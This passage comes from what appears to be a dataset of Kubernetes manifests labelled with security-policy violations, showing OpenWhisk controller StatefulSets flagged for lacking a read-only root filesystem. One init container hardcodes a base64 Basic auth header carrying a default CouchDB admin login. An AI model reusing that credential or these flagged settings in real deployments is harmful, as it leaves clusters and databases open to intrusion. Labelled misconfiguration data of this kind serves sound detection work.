],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n          value: 256m\n        - name: CONFIG_whisk_concurrencyLimit_min\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_max\n          value: '1'\n        - name: CONFIG_whisk_concurrencyLimit_std\n          value: '1'\n        - name: CONFIG_whisk_logLimit_min\n          value: 0m\n        - name: CONFIG_whisk_logLimit_max\n          value: 10m\n        - name: CONFIG_whisk_logLimit_std\n          value: 10m\n        - name: CONFIG_whisk_activation_payload_max\n          value: '1048576'\n        - name: CONFIG_whisk_loadbalancer_blackboxFraction\n          value: 10%\n        - name: CONFIG_whisk_loadbalancer_timeoutFactor\n          value: '2'\n        - name: KAFKA_HOSTS\n          value: RELEASE-NAME-kafka-0.RELEASE-NAME-kafka.default.svc.cluster.local:9092\n        - name: CONFIG_whisk_kafka_replicationFactor\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_cacheInvalidation_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_completed_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_events_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_health_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionBytes\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_retentionMs\n          value: ''\n        - name: CONFIG_whisk_kafka_topics_invoker_segmentBytes\n          value: ''\n        - name: CONFIG_whisk_couchdb_username\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_username\n        - name: CONFIG_whisk_couchdb_password\n          valueFrom:\n            secretKeyRef:\n              name: RELEASE-NAME-db.auth\n              key: db_password\n        - name: CONFIG_whisk_couchdb_port\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_port\n        - name: CONFIG_whisk_couchdb_protocol\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_protocol\n        - name: CONFIG_whisk_couchdb_host\n          value: RELEASE-NAME-couchdb.default.svc.cluster.local\n        - name: CONFIG_whisk_couchdb_provider\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_provider\n        - name: CONFIG_whisk_couchdb_databases_WhiskActivation\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_activations\n        - name: CONFIG_whisk_couchdb_databases_WhiskEntity\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_actions\n        - name: CONFIG_whisk_couchdb_databases_WhiskAuth\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-db.config\n              key: db_whisk_auths\n        - name: CONTROLLER_INSTANCES\n          value: '1'\n        - name: CONFIG_logback_log_level\n          value: INFO\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"controller\" does not have a read-only root file system"
  },
  {
    "id": "10546",
    "manifest_path": "data/manifests/the_stack_sample/sample_4076.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: StatefulSet\nmetadata:\n  name: RELEASE-NAME-controller\n  labels:\n    name: RELEASE-NAME-controller\n    heritage: Helm\n    release: RELEASE-NAME\n    chart: openwhisk-1.0.1\n    app: RELEASE-NAME-openwhisk\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: RELEASE-NAME-controller\n  template:\n    metadata:\n      labels:\n        name: RELEASE-NAME-controller\n        heritage: Helm\n        release: RELEASE-NAME\n        chart: openwhisk-1.0.1\n        app: RELEASE-NAME-openwhisk\n    spec:\n      serviceAccountName: RELEASE-NAME-core\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: NotIn\n                values:\n                - invoker\n          - weight: 80\n            preference:\n              matchExpressions:\n              - key: openwhisk-role\n                operator: In\n                values:\n                - core\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchExpressions:\n              - key: name\n                operator: In\n                values:\n                - RELEASE-NAME-controller\n            topologyKey: kubernetes.io/hostname\n      initContainers:\n      - name: wait-for-kafka\n        image: openwhisk/ow-utils:3e6138d\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - 'cacert=\"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt\"; token=\"$(cat\n          /var/run/secrets/kubernetes.io/serviceaccount/token)\"; while true; do rc=$(curl\n          -sS --cacert $cacert --header \"Authorization: Bearer $token\" https://kubernetes.default.svc/api/v1/namespaces/default/endpoints/RELEASE-NAME-kafka\n          | jq -r \".subsets[].addresses | length\"); echo \"num ready kafka endpoints\n          is $rc\"; if [ $rc -gt 0 ]; then echo \"Success: ready kafka endpoint!\"; break;\n          fi; echo \"kafka not ready yet; sleeping for 3 seconds\"; sleep 3; done;'\n      - name: wait-for-couchdb\n        image: busybox:latest\n        imagePullPolicy: IfNotPresent\n        env:\n        - name: READINESS_URL\n          value: http://RELEASE-NAME-couchdb.default.svc.cluster.local:5984/ow_kube_couchdb_initialized_marker\n        command:\n        - sh\n        - -c\n        - 'while true; do echo ''checking CouchDB readiness''; wget -T 5 --spider\n          $READINESS_URL --header=\"Authorization: Basic d2hpc2tfYWRtaW46c29tZV9wYXNzdzByZA==\";\n          result=$?; if [ $result -eq 0 ]; then echo ''Success: CouchDB is ready!'';\n          break; fi; echo ''...not ready yet; sleeping 3 seconds before retry''; sleep\n          3; done;'\n      containers:\n      - name: controller\n        imagePullPolicy: IfNotPresent\n        image: openwhisk/controller:3e6138d\n        command:\n        - /bin/bash\n        - -c\n        - /init.sh `hostname | awk -F '-' '{print $NF}'`\n        ports:\n        - name: controller\n          containerPort: 8080\n        - name: akka-remoting\n          containerPort: 2552\n        - name: akka-mgmt-http\n          containerPort: 19999\n        livenessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /ping\n            port: 8080\n            scheme: HTTP\n          initialDelaySeconds: 10\n          periodSeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: PORT\n          value: '8080'\n        - name: TZ\n          value: UTC\n        - name: CONFIG_whisk_info_date\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_date\n        - name: CONFIG_whisk_info_buildNo\n          valueFrom:\n            configMapKeyRef:\n              name: RELEASE-NAME-whisk.config\n              key: whisk_info_buildNo\n        - name: JAVA_OPTS\n          value: '-Xmx1024M '\n        - name: CONTROLLER_OPTS\n          value: ' '\n        - name: RUNTIMES_MANIFEST\n          value: \"{\\n    \\\"runtimes\\\": {\\n        \\\"nodejs\\\": [\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"nodejs:12\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-nodejs-v12\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"nodejs:14\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-nodejs-v14\\\",\\n                    \\\"tag\\\": \\\"1.19.0\\\"\\n  \\\n            \\              },\\n                \\\"deprecated\\\": false,\\n          \\\n            \\      \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      },\\n                \\\"stemCells\\\": [\\n                    {\\n \\\n            \\                       \\\"initialCount\\\": 2,\\n                       \\\n            \\ \\\"memory\\\": \\\"256 MB\\\",\\n                        \\\"reactive\\\": {\\n \\\n            \\                           \\\"minCount\\\": 1,\\n                       \\\n            \\     \\\"maxCount\\\": 4,\\n                            \\\"ttl\\\": \\\"2 minutes\\\"\\\n            ,\\n                            \\\"threshold\\\": 1,\\n                   \\\n            \\         \\\"increment\\\": 1\\n                        }\\n              \\\n            \\      }\\n                ]\\n            }\\n        ],\\n        \\\"python\\\"\\\n            : [\\n            {\\n                \\\"kind\\\": \\\"python:3\\\",\\n        \\\n            \\        \\\"default\\\": true,\\n                \\\"image\\\": {\\n          \\\n            \\          \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"\\\n            action-python-v3.7\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n     \\\n            \\           },\\n                \\\"deprecated\\\": false,\\n             \\\n            \\   \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"codefile\\\"\\\n            ,\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n          \\\n            \\      }\\n            }\\n        ],\\n        \\\"swift\\\": [\\n          \\\n            \\  {\\n                \\\"kind\\\": \\\"swift:4.2\\\",\\n                \\\"default\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-swift-v4.2\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                }\\n      \\\n            \\      },\\n            {\\n                \\\"kind\\\": \\\"swift:5.1\\\",\\n \\\n            \\               \\\"default\\\": false,\\n                \\\"image\\\": {\\n  \\\n            \\                  \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-swift-v5.1\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.3\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.3\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"swift:5.4\\\",\\n                \\\"default\\\": false,\\n        \\\n            \\        \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\",\\n\\\n            \\                    \\\"name\\\": \\\"action-swift-v5.4\\\",\\n              \\\n            \\      \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"java\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"java:8\\\",\\n              \\\n            \\  \\\"default\\\": true,\\n                \\\"image\\\": {\\n                \\\n            \\    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"java8action\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"jarfile\\\",\\n              \\\n            \\      \\\"attachmentType\\\": \\\"application/java-archive\\\"\\n            \\\n            \\    },\\n                \\\"requireMain\\\": true\\n            }\\n      \\\n            \\  ],\\n        \\\"php\\\": [\\n            {\\n                \\\"kind\\\": \\\"\\\n            php:7.3\\\",\\n                \\\"default\\\": false,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-php-v7.3\\\",\\n\\\n            \\                    \\\"tag\\\": \\\"1.17.0\\\"\\n                },\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            },\\n            {\\n                \\\"\\\n            kind\\\": \\\"php:7.4\\\",\\n                \\\"default\\\": true,\\n           \\\n            \\     \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n         \\\n            \\           \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\":\\\n            \\ \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n    \\\n            \\            },\\n                \\\"attached\\\": {\\n                   \\\n            \\ \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"php:8.0\\\",\\n                \\\"default\\\": false,\\n\\\n            \\                \\\"deprecated\\\": false,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-php-v7.4\\\",\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n\\\n            \\                },\\n                \\\"attached\\\": {\\n               \\\n            \\     \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            }\\n        ],\\n     \\\n            \\   \\\"ruby\\\": [\\n            {\\n                \\\"kind\\\": \\\"ruby:2.5\\\"\\\n            ,\\n                \\\"default\\\": true,\\n                \\\"deprecated\\\"\\\n            : false,\\n                \\\"attached\\\": {\\n                    \\\"attachmentName\\\"\\\n            : \\\"codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\\n            \\n                },\\n                \\\"image\\\": {\\n                 \\\n            \\   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-ruby-v2.5\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.17.0\\\"\\n                }\\n      \\\n            \\      }\\n        ],\\n        \\\"go\\\": [\\n            {\\n             \\\n            \\   \\\"kind\\\": \\\"go:1.15\\\",\\n                \\\"default\\\": true,\\n     \\\n            \\           \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n\\\n            \\                    \\\"attachmentName\\\": \\\"codefile\\\",\\n             \\\n            \\       \\\"attachmentType\\\": \\\"text/plain\\\"\\n                },\\n     \\\n            \\           \\\"image\\\": {\\n                    \\\"prefix\\\": \\\"openwhisk\\\"\\\n            ,\\n                    \\\"name\\\": \\\"action-golang-v1.15\\\",\\n          \\\n            \\          \\\"tag\\\": \\\"1.18.0\\\"\\n                }\\n            }\\n   \\\n            \\     ],\\n        \\\"rust\\\": [\\n            {\\n                \\\"kind\\\"\\\n            : \\\"rust:1.34\\\",\\n                \\\"default\\\": true,\\n               \\\n            \\ \\\"deprecated\\\": false,\\n                \\\"attached\\\": {\\n          \\\n            \\          \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                },\\n                \\\"image\\\": {\\n \\\n            \\                   \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-rust-v1.34\\\",\\n                    \\\"tag\\\": \\\"1.3.0\\\"\\\n            \\n                }\\n            }\\n        ],\\n        \\\"dotnet\\\": [\\n\\\n            \\            {\\n                \\\"kind\\\": \\\"dotnet:2.2\\\",\\n          \\\n            \\      \\\"default\\\": true,\\n                \\\"deprecated\\\": false,\\n  \\\n            \\              \\\"requireMain\\\": true,\\n                \\\"image\\\": {\\n\\\n            \\                    \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"\\\n            name\\\": \\\"action-dotnet-v2.2\\\",\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\\n            \\n                },\\n                \\\"attached\\\": {\\n              \\\n            \\      \\\"attachmentName\\\": \\\"codefile\\\",\\n                    \\\"attachmentType\\\"\\\n            : \\\"text/plain\\\"\\n                }\\n            },\\n            {\\n \\\n            \\               \\\"kind\\\": \\\"dotnet:3.1\\\",\\n                \\\"default\\\"\\\n            : false,\\n                \\\"deprecated\\\": false,\\n                \\\"requireMain\\\"\\\n            : true,\\n                \\\"image\\\": {\\n                    \\\"prefix\\\"\\\n            : \\\"openwhisk\\\",\\n                    \\\"name\\\": \\\"action-dotnet-v3.1\\\"\\\n            ,\\n                    \\\"tag\\\": \\\"1.16.0\\\"\\n                },\\n     \\\n            \\           \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ],\\n        \\\"ballerina\\\":\\\n            \\ [\\n            {\\n                \\\"kind\\\": \\\"ballerina:0.990\\\",\\n \\\n            \\               \\\"default\\\": true,\\n                \\\"image\\\": {\\n   \\\n            \\                 \\\"prefix\\\": \\\"openwhisk\\\",\\n                    \\\"name\\\"\\\n            : \\\"action-ballerina-v0.990.2\\\",\\n                    \\\"tag\\\": \\\"nightly\\\"\\\n            \\n                },\\n                \\\"deprecated\\\": false,\\n       \\\n            \\         \\\"attached\\\": {\\n                    \\\"attachmentName\\\": \\\"\\\n            codefile\\\",\\n                    \\\"attachmentType\\\": \\\"text/plain\\\"\\n\\\n            \\                }\\n            }\\n        ]\\n    },\\n    \\\"blackboxes\\\"\\\n            : [\\n        {\\n            \\\"prefix\\\": \\\"openwhisk\\\",\\n            \\\"\\\n            name\\\": \\\"dockerskeleton\\\",\\n            \\\"tag\\\": \\\"1.14.0\\\"\\n       \\\n            \\ }\\n    ]\\n}\\n\"\n        - name: LIMITS_ACTIONS_INVOKES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_INVOKES_CONCURRENT\n          value: '30'\n        - name: LIMITS_TRIGGERS_FIRES_PERMINUTE\n          value: '60'\n        - name: LIMITS_ACTIONS_SEQUENCE_MAXLENGTH\n          value: '50'\n        - name: CONFIG_whisk_timeLimit_min\n          value: 100ms\n        - name: CONFIG_whisk_timeLimit_max\n          value: 5m\n        - name: CONFIG_whisk_timeLimit_std\n          value: 1m\n        - name: CONFIG_whisk_memory_min\n          value: 128m\n        - name: CONFIG_whisk_memory_max\n          value: 512m\n        - name: CONFIG_whisk_memory_std\n       